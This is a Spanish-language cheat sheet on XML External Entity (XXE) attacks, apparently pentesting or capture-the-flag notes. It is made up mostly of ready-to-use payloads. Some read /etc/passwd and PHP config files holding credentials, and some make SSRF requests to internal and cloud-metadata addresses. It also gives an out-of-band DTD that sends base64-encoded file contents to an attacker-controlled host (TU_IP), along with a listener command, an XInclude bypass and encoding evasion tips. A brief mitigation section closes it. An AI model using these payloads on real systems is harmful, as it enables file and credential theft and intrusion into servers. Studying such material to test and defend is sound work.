# XXE (XML External Entity)

La app parsea XML del usuario con un parser que resuelve **entidades externas**
→ lectura de archivos, SSRF, a veces RCE/DoS. Busca endpoints que acepten XML
(SOAP, `Content-Type: application/xml`, uploads de `.xml`/`.svg`/`.docx`, SAML).

## Detección

Envía XML con una entidad y observa si se refleja:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY test "XXE-OK"> ]>
<data>&test;</data>
```

Si `XXE-OK` aparece en la respuesta → el parser resuelve entidades.

## Lectura de archivos (in-band)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>
```

Para ficheros con caracteres que rompen el XML, usa el wrapper PHP base64:

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
```

> Patrón: XXE lee un `.php`/config con **credenciales** → reutilizar para SSH /
> panel. (Lo que ocurre en BountyHunter: XXE → creds en PHP → foothold.)

## SSRF vía XXE

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

## Blind / OOB (sin reflejo) — exfiltración

Aloja un DTD externo en tu servidor:

```xml
<!-- evil.dtd en http://TU_IP/evil.dtd -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://TU_IP/?x=%file;'>">
%eval;
%exfil;
```

Payload que lo invoca:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % dtd SYSTEM "http://TU_IP/evil.dtd"> %dtd; ]>
<data>test</data>
```

```bash
python3 -m http.server 80   # recibe ?x=<base64 de /etc/passwd>
```

## Vectores en formatos ricos
- **SVG** subido como imagen → XXE si el server lo parsea.
- **DOCX/XLSX/PPTX** = zip de XML → inyecta en `document.xml`.
- **SAML** responses.

## Bypass
- Parser que bloquea `DOCTYPE`: prueba **XInclude**:
  ```xml
  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
  </foo>
  ```
- UTF-16 / cambiar encoding para evadir filtros de strings.

## Mitigación
Deshabilitar resolución de entidades externas y DTDs en el parser
(`libxml_disable_entity_loader(true)` en PHP antiguo; `FEATURE_SECURE_PROCESSING`
en Java), usar formatos menos peligrosos (JSON), allowlist de esquemas.
